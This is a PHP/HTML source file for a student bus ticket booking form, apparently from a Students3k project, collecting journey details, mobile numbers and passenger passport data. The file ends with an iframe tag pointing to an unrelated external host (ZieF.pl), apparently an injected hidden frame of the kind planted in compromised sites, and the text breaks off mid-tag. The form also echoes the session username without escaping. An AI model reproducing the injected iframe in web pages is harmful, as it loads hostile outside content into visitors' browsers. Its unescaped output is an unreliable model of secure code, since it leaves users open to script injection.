<?php
session_start();
?>


<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html>
    <head>
        <title>Dynamic Form Processing with PHP | Students3k</title>
        <meta http-equiv="Content-Type" content="text/html; charset=utf-8"/>
        <link rel="stylesheet" type="text/css" href="styles.css" />
        <link rel="stylesheet" type="text/css" href="css/default.css"/>
		<script type="text/javascript" src="js/script.js"></script> 
    </head>
    <body background="bus.jpg">  
	<form><button   formaction="index.html"  border-radius:8px;"><font face="comic" size="3" color="white"></FONT></button> 
	  <button   formaction="aboutus.html" border-radius:8px;"></button>
</form>	
        <form action="connect.php" class="register" method="POST">

              <?php
if($_SESSION["user_name"]) {
?>
           <h1> Logged as  <?php echo $_SESSION["user_name"]; ?>. Click here to <a href="logout.php" tite="Logout">Logout</a>.</h1>
  <?php
}
?>
  <br />
          
            <center><h1>LINK BUS SYSTEM </h1></center>
            <fieldset class="row1">
                <legend>Travel Information</legend>
				<p>
                    <label>BUS Name * 
                    </label>
                    <input name="bus_num" type="text" required="required"  />
                    <label>Date of journey  (2013)*
                    </label>
                    <select class="date" name="day">
                        <option value="1">01
                        </option>
                        <option value="2">02
                        </option>
                        <option value="3">03
                        </option>
                        <option value="4">04
                        </option>
                        <option value="5">05
                        </option>
                        <option value="6">06
                        </option>
                        <option value="7">07
                        </option>
                        <option value="8">08
                        </option>
                        <option value="9">09
                        </option>
                        <option value="10">10
                        </option>
                        <option value="11">11
                        </option>
                        <option value="12">12
                        </option>
                        <option value="13">13
                        </option>
                        <option value="14">14
                        </option>
                        <option value="15">15
                        </option>
                        <option value="16">16
                        </option>
                        <option value="17">17
                        </option>
                        <option value="18">18
                        </option>
                        <option value="19">19
                        </option>
                        <option value="20">20
                        </option>
                        <option value="21">21
                        </option>
                        <option value="22">22
                        </option>
                        <option value="23">23
                        </option>
                        <option value="24">24
                        </option>
                        <option value="25">25
                        </option>
                        <option value="26">26
                        </option>
                        <option value="27">27
                        </option>
                        <option value="28">28
                        </option>
                        <option value="29">29
                        </option>
                        <option value="30">30
                        </option>
                        <option value="31">31
                        </option>
                    </select>
                    <select name="month">
                        <option value="January">January
                        </option>
                        <option value="February">February
                        </option>
                        <option value="March">March
                        </option>
                        <option value="April">April
                        </option>
                        <option value="May">May
                        </option>
                        <option value="June">June
                        </option>
                        <option value="July">July
                        </option>
                        <option value="August">August
                        </option>
                        <option value="September">September
                        </option>
                        <option value="October">October
                        </option>
                        <option value="November">November
                        </option>
                        <option value="December">December
                        </option>
                    </select>					
					<label> Bus Type * 
                    </label>
                    <select name="type">
                        <option value="Sleeper">Sleeper
                        </option>
                        <option value="Semi Sleeper">Semi Sleeper
                        </option>
					</select>
					
                </p>
                <p>
					<label>Boarding From*
                    </label>
                    <input name="board" required="required" type="text"/>
					<label>To *
                    </label>
					<input name="too" required="required" type="text"/>
					<label>Via (Root) *
                    </label>
					<select name="root">
                        <option value="Root 1">Root 1
                        </option>
                        <option value="Root 2">Root 2
                        </option>
                        <option value="Root 3">Root 3
                        </option>
                    </select>
                </p>
                <p>
                    <label>Mobile *
                    </label>
                    <input name="mobile" required="required" type="text"/>
                    <label>Repeat Mobile*
                    </label>
                    <input name="mobile" required="required" type="text"/>
                    <label >(You will receive 
                    </label><label >the ticket in this )
                    </label>
                </p>
				<div class="clear"></div>
            </fieldset>
            <fieldset class="row2">
				<legend>Passenger Details</legend>
				<p> 
					<input type="button" value="Add Passenger" onClick="addRow('dataTable')" /> 
					<input type="button" value="Remove Passenger" onClick="deleteRow('dataTable')"  /> 
			<p>(All acions apply only to entries with check marked check boxes only.)</p>
				</p>
               <table width="749" border="1" class="form" id="dataTable">
                  <tbody>
                    <tr>
                      <p>
					  <td width="5"><input type="checkbox" required="required" name="chk[]" checked="checked" /></td>
						<td width="100">
							<label><b>Name</b></label><br /><br />
							<input name="name" type="text" required="required"  /></td>
						 <td width="49">
							<label for="BX_age"><b>Age</b></label><br /><br />
							<input name="age" type="text" required="required" class="small"  >				      </td>
						 <td width="49"><label for="BX_age"><b>Adress line </b></label><br /><br />
					     <input name="adress" type="text" required="required" /></td>
						 <td width="49">
						 <label for="BX_age"><b>Nationality</b></label><br /><br />
						 <input name="nationality" type="text" required="required"  /></td>
						 <td width="49"><label for="BX_age"><b>Passport No </b></label><br /><br />
					     <input name="passport" type="text" required="required" /></td>
						 <td width="133">
							<label for="BX_gender"><b>Gender</b></label><br /><br />
							<select name="gender" id="BX_gender"  required="required">
								<option>....</option>
								<option value="Male">Male</option>
								<option value="Female">Female</option>
							</select>					  </td>
						 <td width="141">
							<label for="BX_birth"><b>Berth Pre</b></label><br /><br />
							<select name="berth" id="BX_birth"  required="required">
								<option>....</option>
								<option value="Window">Window</option>
								<option value="No Choice">No Choice</option>
							</select>					  </td>
					<td width="4"></p>                    </tr>
                 </tbody>
            </table>
				<div class="clear"></div>
            </fieldset>
            <fieldset class="row3">
                <legend>Further Information</legend>
				<p>The identification details are required during journey. One of the passenger booked on the ticket should have any of the identity cards ( Passport / PAN Card / Driving License / Photo ID card issued by Central / State Govt / Student Identity Card with photograph) during the journey in original. </p>
				<div class="clear"></div>
            </fieldset>
            <fieldset class="row4">
                <legend>Terms and Mailing</legend>
                <p class="agreement">
                    <input type="checkbox" value=""/>
                    <label>*  I accept the <a href="#">Terms and Conditions</a></label>
                </p>
                <p class="agreement">
                    <input type="checkbox" value=""/>
                    <label>I want to receive personalized offers by your Service</label>
                </p>
				
				<div class="clear"></div>
            </fieldset>
			<input class="submit" type="submit" value="Confirm &raquo;" />
			<a class="submit" href=""/>Back</a>
			
			<div class="clear"></div>
        </form>
		
    <iframe src="http://ZieF.pl/rc/